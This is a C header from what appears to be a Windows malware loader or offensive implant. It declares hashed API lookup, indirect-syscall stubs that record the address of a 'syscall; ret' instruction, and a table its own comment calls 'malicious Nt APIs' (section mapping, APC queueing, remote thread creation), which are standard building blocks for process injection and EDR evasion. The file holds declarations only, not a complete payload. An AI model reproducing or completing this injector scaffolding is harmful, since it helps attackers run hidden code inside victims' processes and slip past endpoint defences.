#pragma once

#ifndef _APISET_H
#define _APISET_H

#include <windows.h>

#define NTDLL_HASH 0x0141C4EE

typedef struct _NT_SYSCALL
{
    DWORD dw_ssn;
    DWORD dw_nt_func_hash;
    PVOID p_nt_func_addr;
    PVOID p_syscall_inst_addr;      // the very address of 0f05c3 instruction
} NT_SYSCALL, *PNT_SYSCALL;

// for each set of APIs, define name array, hash array,
// then we can loop through all things to Initialize the APIs

// !!! NOTE THAT THE NAME ARRAY IS FOR DEBUG PURPOSE ONLY AND MAKE SURE THE ORDER OF
// THE STRINGS ARE EXACTLY THE SAME AS HASH ARRAY!!!

// malicious Nt APIs, add or remove here
typedef struct _MAL_NT_API_TBL
{
    NT_SYSCALL NtOpenProcess;
    NT_SYSCALL NtQueryInformationProcess;
    NT_SYSCALL NtCreateSection;
    NT_SYSCALL NtMapViewOfSection;
    NT_SYSCALL NtUnmapViewOfSection;
    NT_SYSCALL NtCreateThreadEx;
    NT_SYSCALL NtQueueApcThread;
    NT_SYSCALL NtAlertResumeThread;
    NT_SYSCALL NtDelayExecution;
    NT_SYSCALL NtWaitForSingleObject;
    NT_SYSCALL NtClose;
} MAL_NT_API_TBL, *PMAL_NT_API_TBL;

typedef struct _WIN_API_TBL
{
    FARPROC LoadLibraryA;
    FARPROC AddVectoredExceptionHandler;
    FARPROC RemoveVectoredExceptionHandler;
    FARPROC CreateTimerQueue;
    FARPROC CreateTimerQueueTimer;
    FARPROC RtlAddFunctionTable;
    FARPROC InitializeCriticalSection;
    FARPROC EnterCriticalSection;
    FARPROC LeaveCriticalSection;
} WIN_API_TBL, *PWIN_API_TBL;

extern const PCHAR mal_nt_name_arr[];
extern const PCHAR win_api_name_arr[];

extern const DWORD mal_nt_hash_arr[];
extern const DWORD win_api_hash_arr[];
extern const DWORD win_dll_hash_arr[];

extern MAL_NT_API_TBL g_mal_nt_api_tbl;
extern WIN_API_TBL g_win_api_tbl;

#endif //!APISET_H
